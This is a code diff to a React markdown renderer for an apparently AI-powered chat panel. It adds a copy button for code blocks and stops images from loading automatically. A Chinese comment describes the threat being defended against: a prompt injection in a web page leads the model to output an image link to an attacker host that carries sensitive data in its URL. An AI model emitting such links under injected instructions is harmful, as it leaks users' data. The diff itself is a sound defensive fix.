@@ -1,4 +1,4 @@
-import { memo, type ComponentPropsWithoutRef } from 'react';
+import { memo, useEffect, useRef, useState, type ComponentPropsWithoutRef } from 'react';
 import ReactMarkdown, { type Options } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import remarkBreaks from 'remark-breaks';
@@ -8,6 +8,8 @@ import rehypeKatex from 'rehype-katex';
 import 'highlight.js/styles/github.css';
 import 'katex/dist/katex.min.css';
 import { normalizeMathDelimiters } from '@/lib/chat/math-delimiters';
+import { useTranslation } from '@/lib/i18n';
+import { IconCheck, IconCopy } from './icons';
 
 import bash from 'highlight.js/lib/languages/bash';
 import css from 'highlight.js/lib/languages/css';
@@ -55,10 +57,75 @@ const REHYPE_PLUGINS: NonNullable<Options['rehypePlugins']> = [
   rehypeKatex,
   [rehypeHighlight, { languages: HIGHLIGHT_LANGUAGES }],
 ];
+// 图片不自动加载：回答内容可能受网页里的提示注入操纵，模型一旦输出
+// ![](https://攻击者/?d=<敏感内容>)，<img> 渲染瞬间就会把数据带出去，用户什么都不用做。
+// 扩展页面的默认 CSP 不限制 img-src，脱敏也拦不住任意文本，所以在渲染层直接不发请求：
+// 换成一个显示 alt 和域名的链接，用户主动点击才打开。
+function MarkdownImage({ src, alt }: ComponentPropsWithoutRef<'img'> & { node?: unknown }) {
+  const { t } = useTranslation();
+  const label = `${t('chat.markdownImageLabel')}${alt ? `: ${alt}` : ''}`;
+  let host = '';
+  try {
+    const url = typeof src === 'string' ? new URL(src) : null;
+    if (url && (url.protocol === 'http:' || url.protocol === 'https:')) host = url.host;
+  } catch {
+    // 相对地址或非法地址：只显示文字
+  }
+  if (!host) return <span className="md-image-placeholder">[{label}]</span>;
+  return (
+    <a
+      className="md-image-placeholder"
+      href={src}
+      target="_blank"
+      rel="noreferrer"
+      title={t('chat.markdownImageTitle', { url: src as string })}
+    >
+      [{label} · {host}]
+    </a>
+  );
+}
+
+// 代码块复制按钮：回答里经常给出选择器、脚本、CSS 片段，用户只想要代码本身而不是整条消息。
+// 复制时读 <pre> 的 textContent——高亮后的 code 被拆成很多 span，DOM 文本就是原始代码。
+function MarkdownPre({ node: _node, children, ...props }: ComponentPropsWithoutRef<'pre'> & { node?: unknown }) {
+  const { t } = useTranslation();
+  const preRef = useRef<HTMLPreElement>(null);
+  const [copied, setCopied] = useState(false);
+  const timeoutRef = useRef<number | null>(null);
+
+  useEffect(() => () => {
+    if (timeoutRef.current !== null) window.clearTimeout(timeoutRef.current);
+  }, []);
+
+  async function copy() {
+    const text = (preRef.current?.textContent ?? '').replace(/\n$/, '');
+    try {
+      await navigator.clipboard.writeText(text);
+    } catch {
+      return;
+    }
+    setCopied(true);
+    if (timeoutRef.current !== null) window.clearTimeout(timeoutRef.current);
+    timeoutRef.current = window.setTimeout(() => setCopied(false), 2000);
+  }
+
+  const label = t(copied ? 'chat.copiedLabel' : 'chat.copyCodeAriaLabel');
+  return (
+    <div className="md-pre-wrap">
+      <pre ref={preRef} {...props}>{children}</pre>
+      <button type="button" className="md-copy-code" onClick={() => void copy()} aria-label={label} title={label}>
+        {copied ? <IconCheck className="h-3.5 w-3.5" /> : <IconCopy className="h-3.5 w-3.5" />}
+      </button>
+    </div>
+  );
+}
+
 const MARKDOWN_COMPONENTS = {
   a: ({ node: _node, ...props }: ComponentPropsWithoutRef<'a'> & { node?: unknown }) => (
     <a {...props} target="_blank" rel="noreferrer" />
   ),
+  img: MarkdownImage,
+  pre: MarkdownPre,
   table: ({ node: _node, ...props }: ComponentPropsWithoutRef<'table'> & { node?: unknown }) => (
     <div className="md-table-wrap">
       <table {...props} />
